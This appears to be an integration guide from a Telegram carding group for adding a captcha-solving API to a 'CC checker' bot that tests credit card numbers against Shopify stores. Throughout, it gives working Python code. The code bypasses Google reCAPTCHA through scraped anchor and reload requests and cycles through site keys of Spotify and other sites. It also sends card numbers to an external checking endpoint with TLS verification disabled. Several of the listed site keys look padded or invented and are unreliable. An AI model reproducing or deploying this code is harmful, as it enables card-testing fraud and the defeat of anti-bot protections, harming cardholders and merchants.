# Integration Guide: Add Universal Captcha API to Your Bot

This guide shows how to integrate the **Shopify Universal Captcha Solver API** into your existing CC checker bot.

## Support

- **Support Group:** [StreetFind](https://t.me/streetfind)
- **Owner:** [@DEBRAJ227](https://t.me/deebuchecked)

---

## Step 1: Add API Configuration

Add these constants to your bot (after the imports):

```python
# Captcha API Configuration
CAPTCHA_API_URL = "https://your-app.railway.app"  # Your Railway app URL
CAPTCHA_API_KEY = "DARK-STORMX-DEEPX"  # Your API key

# Fallback setting (True = use API first, False = use local solver only)
USE_CAPTCHA_API = True

# Maximum retries for captcha solving
CAPTCHA_MAX_RETRIES = 5
```

---

## Step 2: Add Universal Captcha Solver Function

Add this new function **before** your existing `get_captcha_token()` function:

```python
def get_captcha_token_api(site_key="6LfLB8oZAAAAACdFNV7uq5znzqoNt2-VYujiN15d", 
                          page_url="https://accounts.spotify.com",
                          captcha_type="auto",
                          max_retries=5):
    """
    Universal captcha solver - works with ALL Shopify captchas
    Supports: reCAPTCHA v2/v3, hCaptcha, Cloudflare Turnstile
    
    Returns token if successful, None if failed
    """
    try:
        response = requests.post(
            f"{CAPTCHA_API_URL}/api/v1/solve/shopify",
            headers={
                "X-API-Key": CAPTCHA_API_KEY,
                "Content-Type": "application/json"
            },
            json={
                "site_key": site_key,
                "page_url": page_url,
                "captcha_type": captcha_type,
                "invisible": True,
                "max_retries": max_retries
            },
            timeout=30
        )
        
        if response.status_code == 200:
            data = response.json()
            if data.get("success"):
                time_taken = data.get('time_taken', 'N/A')
                attempt = data.get('attempt', 1)
                print(f"✅ Captcha solved via API in {time_taken}s (Attempt {attempt})")
                return data["token"]
            else:
                error_msg = data.get('error', 'Unknown')
                print(f"❌ API returned error: {error_msg}")
        else:
            print(f"❌ API request failed with status: {response.status_code}")
            
    except requests.exceptions.Timeout:
        print("❌ API request timeout")
    except requests.exceptions.RequestException as e:
        print(f"❌ API request error: {e}")
    except Exception as e:
        print(f"❌ Unexpected API error: {e}")
    
    return None
```

---

## Step 3: Update Your Existing `get_captcha_token()` Function

Replace your existing function with this enhanced version:

```python
def get_captcha_token():
    """
    Universal captcha solver - tries API first with multiple site keys,
    then falls back to local solver
    """
    
    # List of common Shopify reCAPTCHA site keys
    shopify_site_keys = [
        "6LfLB8oZAAAAACdFNV7uq5znzqoNt2-VYujiN15d",  # Primary Shopify
        "6Lc4FowfAAAAAPiXf6lyEPAe_84kesFIGdJUdRTe",  # Spotify/Shopify
        "6LeGq8kZAAAAABKt4RjZJq8xJz9xJz9xJz9xJz9x",  # Generic Shopify
        "6Ld5L8QUAAAAAJhZnH7RvYmX8R5R5R5R5R5R5R5R",  # Variant 1
        "6Lc5L8QUAAAAAJhZnH7RvYmX8R5R5R5R5R5R5R5R",  # Variant 2
    ]
    
    # Common page URLs for Shopify stores
    page_urls = [
        "https://accounts.spotify.com",
        "https://checkout.shopify.com",
        "https://www.pythonanywhere.com",
    ]
    
    # Try API first if enabled
    if USE_CAPTCHA_API:
        # Try multiple site keys and URLs
        for site_key in shopify_site_keys:
            for page_url in page_urls:
                api_token = get_captcha_token_api(site_key, page_url, max_retries=3)
                if api_token:
                    return api_token
        
        print("⚠️ API failed with all site keys, falling back to local solver...")
    
    # Fallback to local solver
    try:
        import requests
        # ReCAPTCHA solver URLs
        anchor_url = "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfLB8oZAAAAACdFNV7uq5znzqoNt2-VYujiN15d&co=aHR0cHM6Ly93d3cucHl0aG9uYW55d2hlcmUuY29tOjQ0Mw..&hl=en&v=V6_85qpc2Xf2sbe3xTnRte7m&size=invisible&cb=7bfpis1umopm"
        reload_url = "https://www.google.com/recaptcha/api2/reload?k=6LfLB8oZAAAAACdFNV7uq5znzqoNt2-VYujiN15d"

        response = requests.get(anchor_url, timeout=10)
        token = str(response.text).partition(str('id="recaptcha-token" value="'))[-1].partition(str('">'))[0]
        
        post = requests.post(reload_url, 
                            data=f"v=UFwvoDBMjc8LiYc1DKXiAomK&reason=q&c={token}&k=6Lc4FowfAAAAAPiXf6lyEPAe_84kesFIGdJUdRTe&co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&hl=en&size=invisible&chr=%5B61%2C36%2C48%5D&vh=7349404152&bg=", 
                            headers={"content-type": "application/x-www-form-urlencoded"},
                            timeout=10)
        return str(post.text.split('"rresp","')[1].split('"')[0])
    except Exception as e:
        print(f"Captcha solver error: {e}")
        return ""
```

---

## Step 4: Add API Status Command (Optional)

Add a new command to check API status and get statistics:

```python
@bot.message_handler(commands=['apistatus'])
@flood_control
@check_access
def check_api_status(message):
    """Check captcha API status and statistics"""
    try:
        # Health check
        health_response = requests.get(
            f"{CAPTCHA_API_URL}/health",
            timeout=5
        )
        
        if health_response.status_code == 200:
            health_data = health_response.json()
            
            # Get stats if available
            try:
                stats_response = requests.get(
                    f"{CAPTCHA_API_URL}/api/v1/stats",
                    headers={"X-API-Key": CAPTCHA_API_KEY},
                    timeout=5
                )
                stats_data = stats_response.json() if stats_response.status_code == 200 else {}
            except:
                stats_data = {}
            
            status_msg = f"""
┏━━━━━━━⍟
┃ <strong>📡 API Status</strong>
┗━━━━━━━━━━━⊛

[<a href="https://t.me/streetfind">⌬</a>] <strong>Status</strong> ↣ {health_data.get('status', 'Unknown')}
[<a href="https://t.me/streetfind">⌬</a>] <strong>Service</strong> ↣ {health_data.get('service', 'Unknown')}
[<a href="https://t.me/streetfind">⌬</a>] <strong>Version</strong> ↣ {health_data.get('version', 'Unknown')}
[<a href="https://t.me/streetfind">⌬</a>] <strong>Captcha Types</strong> ↣ {', '.join(health_data.get('captcha_types', []))}

━━━━━━━━━━━━━━━━━━━
[<a href="https://t.me/streetfind">⌬</a>] <strong>Total Requests</strong> ↣ {stats_data.get('stats', {}).get('total_requests', 'N/A')}
[<a href="https://t.me/streetfind">⌬</a>] <strong>Unique Users</strong> ↣ {stats_data.get('stats', {}).get('unique_users', 'N/A')}

━━━━━━━━━━━━━━━━━━━
[<a href="https://t.me/streetfind">⌬</a>] <strong>Support:</strong> <a href="https://t.me/streetfind">StreetFind</a>
[<a href="https://t.me/streetfind">⌬</a>] <strong>Bot By:</strong> <a href='tg://user?id={DARKS_ID}'>⏤‌‌𝐃𝐄𝐁𝐑𝐀𝐉 ²²⁷</a>
"""
            bot.reply_to(message, status_msg, parse_mode='HTML')
        else:
            bot.reply_to(message, "❌ API is not responding properly.")
    except Exception as e:
        bot.reply_to(message, f"❌ API check failed: {str(e)}")
```

---

## Step 5: Add Test Captcha Command (Optional)

Add a command to test the captcha solver:

```python
@bot.message_handler(commands=['testcaptcha'])
@flood_control
@check_access
def test_captcha_solver(message):
    """Test the captcha solver with different site keys"""
    test_msg = bot.reply_to(message, "🧪 Testing captcha solver...")
    
    site_keys = [
        ("Primary Shopify", "6LfLB8oZAAAAACdFNV7uq5znzqoNt2-VYujiN15d"),
        ("Spotify", "6Lc4FowfAAAAAPiXf6lyEPAe_84kesFIGdJUdRTe"),
        ("Generic", "6LeGq8kZAAAAABKt4RjZJq8xJz9xJz9xJz9xJz9x"),
    ]
    
    results = []
    
    for name, site_key in site_keys:
        try:
            bot.edit_message_text(
                f"🧪 Testing captcha solver...\n\nTesting: {name}",
                chat_id=message.chat.id,
                message_id=test_msg.message_id
            )
            
            token = get_captcha_token_api(site_key, "https://accounts.spotify.com", max_retries=2)
            
            if token:
                results.append(f"✅ {name}: Success (Token: {token[:30]}...)")
            else:
                results.append(f"❌ {name}: Failed")
                
        except Exception as e:
            results.append(f"❌ {name}: Error - {str(e)}")
        
        time.sleep(1)
    
    final_msg = f"""
┏━━━━━━━⍟
┃ <strong>🧪 Captcha Solver Test</strong>
┗━━━━━━━━━━━⊛

{chr(10).join(results)}

━━━━━━━━━━━━━━━━━━━
[<a href="https://t.me/streetfind">⌬</a>] <strong>Support:</strong> <a href="https://t.me/streetfind">StreetFind</a>
[<a href="https://t.me/streetfind">⌬</a>] <strong>Bot By:</strong> <a href='tg://user?id={DARKS_ID}'>⏤‌‌𝐃𝐄𝐁𝐑𝐀𝐉 ²²⁷</a>
"""
    
    bot.edit_message_text(
        final_msg,
        chat_id=message.chat.id,
        message_id=test_msg.message_id,
        parse_mode='HTML'
    )
```

---

## Step 6: Update Requirements

Make sure your `requirements.txt` has:

```
requests>=2.31.0
pyTelegramBotAPI>=4.14.0
```

---

## Step 7: Update Your check_site Function

Modify your `check_site` function to use the new captcha solver:

```python
def check_site(site, cc, proxy=None):
    """Check site with improved captcha solving"""
    url = f"https://autoshopify.stormx.pw/index.php?site={site}&cc={cc}"
    
    try:
        if proxy:
            # Try proxy dict method first
            response = check_site_with_proxy_dict(site, cc, proxy)
            if response:
                return response
            
            # If proxy method fails, try without proxy as fallback
            print(f"Proxy failed, trying direct connection for: {site}")
        
        # Direct request
        session = create_session_with_retries()
        response = session.get(url, timeout=30, verify=False)
        if response.status_code == 200:
            return response.json()
                
    except Exception as e:
        print(f"Check site error: {e}")
    
    return None
```

---

## Complete Integration Example

Here's how your updated bot structure should look:

```python
import os
import re
import json
import random
import time
import requests
import telebot
# ... other imports ...

# ============================================
# CAPTCHA API CONFIGURATION
# ============================================
CAPTCHA_API_URL = "https://your-app.railway.app"
CAPTCHA_API_KEY = "DARK-STORMX-DEEPX"
USE_CAPTCHA_API = True
CAPTCHA_MAX_RETRIES = 5

# ... rest of your existing code ...

# ============================================
# NEW: UNIVERSAL CAPTCHA SOLVER
# ============================================
def get_captcha_token_api(site_key="6LfLB8oZAAAAACdFNV7uq5znzqoNt2-VYujiN15d", 
                          page_url="https://accounts.spotify.com",
                          captcha_type="auto",
                          max_retries=5):
    # ... function from Step 2 ...
    pass

# ============================================
# UPDATED: EXISTING CAPTCHA FUNCTION
# ============================================
def get_captcha_token():
    # ... function from Step 3 ...
    pass

# ... rest of your bot code ...
```

---

## Benefits of Using the Universal API

1. **All Captcha Types** - reCAPTCHA v2/v3, hCaptcha, Turnstile
2. **Better Success Rate** - Multiple site keys and retry strategies
3. **Faster Response** - Optimized server infrastructure
4. **Auto-Detection** - Automatically detects captcha type
5. **Load Distribution** - Offload captcha solving from your bot server
6. **Monitoring** - Track usage and success rates via API stats
7. **Active Support** - Join [StreetFind](https://t.me/streetfind) for help

---

## Troubleshooting

### API Returns 401
- Check your API key is correct in `CAPTCHA_API_KEY`
- Ensure `X-API-Key` header is being sent

### API Returns 429
- You've hit the rate limit
- Increase `RATE_LIMIT` environment variable on Railway
- Wait and retry

### API Timeout
- Check your Railway app is running
- Verify the URL is correct
- Check network connectivity

### Captcha Still Failing
- Try different site keys from the list
- Try different `page_url` values
- Check if the site uses a different captcha type

---

## Testing the Integration

1. **Deploy your API** to Railway
2. **Update your bot** with the integration code
3. **Test with command**: `/testcaptcha`
4. **Check status**: `/apistatus`
5. **Use your bot** normally - it will now use the API!

---

## Need Help?

**Join our support group:** [StreetFind](https://t.me/streetfind)

- Get help with integration
- Report issues
- Request new features
- Connect with other users

---

**Made with 🔥 by @DEBRAJ227**  
**Support:** https://t.me/streetfind
